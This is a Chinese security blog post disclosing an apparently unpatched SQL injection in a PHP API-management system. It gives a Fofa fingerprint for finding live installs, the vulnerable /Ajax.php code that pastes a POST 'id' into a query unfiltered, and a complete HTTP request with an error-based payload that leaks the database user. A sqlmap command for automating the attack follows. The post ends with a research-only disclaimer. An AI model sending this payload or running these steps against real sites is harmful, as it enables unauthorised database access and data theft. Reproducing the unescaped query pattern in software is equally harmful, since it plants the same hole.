#  (0day)API接口调用多用户管理系统存在前台SQL注入漏洞   
原创 Mstir  星悦安全   2024-11-09 12:24  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**█ 纸上得来终觉浅，绝知此事要躬行 █**  
  
**2024全新开发API接口调用管理系统网站源码 附教程**  
  
**用layui框架写的 个人感觉很简洁 方便使用和二次开发**  
  
**智能调用管理：该系统提供了智能化的API接口调用管理功能，用户可以通过系统轻松管理各种接口的调用情况，包括调用频率、成功率、响应时间等指标。**  
  
**定制化配置：系统提供了丰富的定制化配置选项，用户可以根据自己的需求进行个性化设置，满足不同场景下的使用要求.**  
  
**Fofa指纹:"./assets/layuiadmin/style/res/logo.png"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cbTzPFTKbjGk25s3Yd2pF9hxzbcecdKUiaU5ZfPLZJtasJ8E1fk9MmwL1NXzsTa8MicQ9ztbJJHgKw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cbTzPFTKbjGk25s3Yd2pF9gkiaLAy8MPplCQhZqRl5uhOAXwoe2ThNKdetWYvBPIV1ibfGsrfzn2qw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cbTzPFTKbjGk25s3Yd2pF9Sbn1esqAgCHUAJicsuScwsV6hTZxamT4kRrP1oXEBKwslsjgJExYusw/640?wx_fmt=png&from=appmsg "")  
## 0x01 前台SQL注入漏洞  
##   
  
**在 /Ajax.php 中可以传入/Ajax.php?order 直接进入Case分支中，然后通过POST传入id参数直接被拼接到SQL查询中，且无任何过滤，导致漏洞产生.**  
```
<?php
include 'includes/Config.php';
$url = $_SERVER["QUERY_STRING"];
$ip = $_SERVER["REMOTE_ADDR"]; 
@header('Content-Type: application/json; charset=UTF-8');
switch($url){
case 'order': 
  $id = $_POST['id'];
  $query = mysqli_query($con,"select * from `sc_inter` WHERE id='$id'");
    $query_id = mysqli_fetch_array($query);
  if(empty($id)){exit('{"code":-1,"msg":"请检查是否已经删除！"}');}else{
  $data= '<link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css" media="all"/><style>.layui-layer-content{padding:10px;}</style><div class="form-group"><div class="input-group"><div class="input-group-addon" id="inputname1">接口名称</div><input type="text" disabled="disabled" id="inputnm" value="'.$query_id['name'].'" class="form-control" required/></div></div>
          <div class="form-group"><div class="input-group"><div class="input-group-addon" id="inputname">反馈信息</div><textarea type="text" autocomplete="off" style="width:352px;height:110px;padding:0 2px 0 6px;" id="inputlink" value="" class="form-control"></textarea></div></div>
        ';
  $data.= '<input type="submit" id="save" onclick="saveOrder('.$id.')" class="btn btn-primary btn-block" value="提交信息" style="margin:4px auto;width:98%;">';
  $result=array("code"=>0,"msg"=>"succ","data"=>$data);}
  exit(json_encode($result));
break;
```  
  
**Payload:**  
```
POST /Ajax.php?order HTTP/1.1
Content-Length: 211
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1
Connection: close

id='||(SELECT 0x6969666d WHERE 5474=5474 AND (SELECT 9261 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```  
Python sqlmap.py -r a.txt --level=3 --dbms=mysql  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**API源码关注公众号发送 241109 获取!**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
